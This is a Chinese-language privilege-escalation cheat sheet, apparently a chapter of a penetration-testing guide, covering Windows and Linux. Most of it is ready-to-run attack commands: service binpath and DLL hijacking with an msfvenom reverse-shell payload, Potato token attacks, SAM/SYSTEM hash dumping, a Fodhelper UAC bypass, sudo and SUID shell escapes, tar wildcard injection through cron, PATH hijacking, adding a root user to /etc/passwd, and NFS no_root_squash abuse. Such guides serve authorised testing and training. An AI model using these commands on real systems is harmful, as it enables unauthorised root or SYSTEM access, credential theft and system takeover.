# ⬆️ 阶段 3：权限提升（Privilege Escalation）

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./03-Privilege-Escalation.tr.md) • [🇬🇷 Ελληνικά](./03-Privilege-Escalation.el.md)

```
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

**目标：** 将普通用户权限提升至 Administrator/SYSTEM（Windows）或 root（Linux）。

> **译注：** 原文以版本号和工具适用系统范围作快速提示，实际是否受影响还取决于补丁回移、系统构建、权限及配置。`evil:$1$evil$xyz...` 是不完整的密码哈希示例。UAC 绕过也不能普遍将普通账户变成管理员。`showmount -e` 列出导出项，并不单独证明存在 `no_root_squash`；还需核对导出配置。

> 📚 **完整指南：** [Windows PrivEsc](../../Windows-PrivEsc/README.md) | [Linux PrivEsc](../../Linux-PrivEsc/README.md)

---

## 🖥️ Windows 权限提升

### 优先检查的常见突破点
```cmd
# 检查当前权限
whoami /priv
whoami /groups

# 检查已存储的凭据
cmdkey /list

# 无人值守安装文件
dir /s C:\*unattend.xml C:\*sysprep.inf C:\*sysprep.xml 2>nul

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### 服务漏洞利用

#### 未加引号的服务路径
```cmd
# 查找未加引号的路径
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# 若发现：C:\Program Files\Some Service\service.exe
# 将恶意 exe 放置于：C:\Program.exe 或 C:\Program Files\Some.exe
```

#### 服务权限配置不当
```cmd
# 使用 accesschk 检查服务权限
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# 若具有 SERVICE_CHANGE_CONFIG：
sc config VulnService binpath="C:\temp\shell.exe"
sc stop VulnService
sc start VulnService
```

#### DLL 劫持
```powershell
# 查找缺失 DLL 的服务（使用 Process Monitor）
# 将恶意 DLL 放到服务目录
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### 令牌模拟（Token Impersonation）

#### SeImpersonatePrivilege（Potato 系列攻击）
```cmd
# 检查是否具有 SeImpersonatePrivilege
whoami /priv

# PrintSpoofer (Windows 10/Server 2016-2019)
.\PrintSpoofer.exe -i -c cmd

# GodPotato (Windows 2012-2022)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "C:\temp\shell.exe"

# JuicyPotato (Windows 7/Server 2008-2016)
.\JuicyPotato.exe -l 1337 -p C:\temp\shell.exe -t * -c {CLSID}
```

#### SeBackupPrivilege
```powershell
# 备份 SAM 和 SYSTEM
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

# 在攻击机上提取哈希
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### 注册表利用
```cmd
# 自动运行项
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# 计划任务中的可写路径
schtasks /query /fo LIST /v | findstr /i "Task To Run"

# 注册表权限
accesschk.exe -kvw hklm\SOFTWARE
```

### UAC（用户账户控制）绕过
```powershell
# Fodhelper 绕过（Windows 10）
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\temp\shell.exe"
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

### 自动化工具
```bash
# WinPEAS
.\winPEAS.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# Windows-Exploit-Suggester
python windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2024.xlsx
```

---

## 🐧 Linux 权限提升

### 优先检查的常见突破点
```bash
# Sudo 权限
sudo -l

# SUID 二进制程序
find / -perm -4000 -type f 2>/dev/null

# 可写的 /etc/passwd
ls -la /etc/passwd

# 查看内核版本以查找利用代码
uname -a
```

### Sudo 利用

#### 免密码 Sudo
```bash
# 若 sudo -l 显示：(ALL) NOPASSWD: /usr/bin/vim
sudo vim -c '!sh'

# 若 sudo -l 显示：(ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit

# 若 sudo -l 显示：(ALL) NOPASSWD: /usr/bin/python
sudo python -c 'import os; os.system("/bin/sh")'
```

#### Sudo 版本漏洞利用（CVE-2021-3156）
```bash
# 检查 sudo 版本
sudo --version

# 若 sudo < 1.9.5p2
# 利用代码：https://github.com/blasty/CVE-2021-3156
```

### SUID/SGID 二进制程序
```bash
# 查找 SUID 二进制程序
find / -perm -4000 -type f 2>/dev/null

# 查阅 GTFOBins 中的利用方法
# https://gtfobins.github.io/

# 示例：/usr/bin/find 具有 SUID 权限位
/usr/bin/find . -exec /bin/sh -p \; -quit

# 示例：/usr/bin/vim 具有 SUID 权限位
/usr/bin/vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# 示例：/usr/bin/python 具有 SUID 权限位
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Linux capabilities（细粒度权限能力）
```bash
# 查找设置了 capabilities 的程序
getcap -r / 2>/dev/null

# 示例：python 具有 cap_setuid
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Cron 定时任务
```bash
# 检查 Cron 定时任务
cat /etc/crontab
ls -la /etc/cron.*

# 查找可写脚本
# tar 中的通配符注入：
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /path/shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

### PATH 劫持
```bash
# 若 Cron 任务或脚本未使用完整路径调用程序
# 在 PATH 中的可写目录创建恶意程序

echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
```

### 可写的 /etc/passwd
```bash
# 若 /etc/passwd 可写
# 生成密码哈希
openssl passwd -1 -salt evil password123

# 添加 root 权限用户
echo 'evil:$1$evil$xyz...:0:0::/root:/bin/bash' >> /etc/passwd

# 切换到新建的 root 权限用户
su evil
```

### 内核漏洞利用
```bash
# 检查内核版本
uname -r
cat /proc/version

# 搜索漏洞利用代码
searchsploit linux kernel 4.4 privilege escalation

# 常见内核漏洞利用：
# - DirtyCow (CVE-2016-5195) - Kernel 2.x - 4.x
# - DirtyPipe (CVE-2022-0847) - Kernel 5.8 - 5.16.11
```

### NFS 利用
```bash
# 检查 no_root_squash 配置
showmount -e 192.168.1.10
cat /etc/exports

# 若启用了 no_root_squash：
# 挂载共享，以 root 身份创建 SUID 程序
mount -t nfs 192.168.1.10:/share /mnt
cp /bin/bash /mnt/bash
chmod +s /mnt/bash

# 在目标上：
/mnt/bash -p
```

### 自动化工具
```bash
# LinPEAS
./linpeas.sh

# LinEnum
./LinEnum.sh

# Linux-exploit-suggester
./linux-exploit-suggester.sh

# Linux Smart Enumeration (LSE)
./lse.sh -l 2
```

---

## 📊 快速参考

### Windows 检查清单
```markdown
- [ ] whoami /priv（SeImpersonate、SeBackup 等）
- [ ] 未加引号的服务路径
- [ ] 服务权限配置不当
- [ ] AlwaysInstallElevated
- [ ] 已存储的凭据（cmdkey /list）
- [ ] Unattend/Sysprep 文件
- [ ] 计划任务
- [ ] 运行 WinPEAS/PowerUp
```

### Linux 检查清单
```markdown
- [ ] sudo -l
- [ ] SUID 二进制程序（查阅 GTFOBins）
- [ ] capabilities（细粒度权限能力）
- [ ] Cron 任务（可写脚本、通配符）
- [ ] /etc/passwd 可写
- [ ] 内核版本（漏洞利用）
- [ ] NFS no_root_squash
- [ ] 运行 LinPEAS
```

---

## 🔗 相关速查表

- [Windows 权限提升（完整指南）](../../Windows-PrivEsc/README.md)
- [Linux 权限提升（完整指南）](../../Linux-PrivEsc/README.md)
- [Mimikatz](../../Mimikatz/README.md)

---

**上一阶段：** [← 02 - 枚举](./02-Enumeration.zh-CN.md)

**下一阶段：** [04 - 横向移动 →](./04-Lateral-Movement.zh-CN.md)
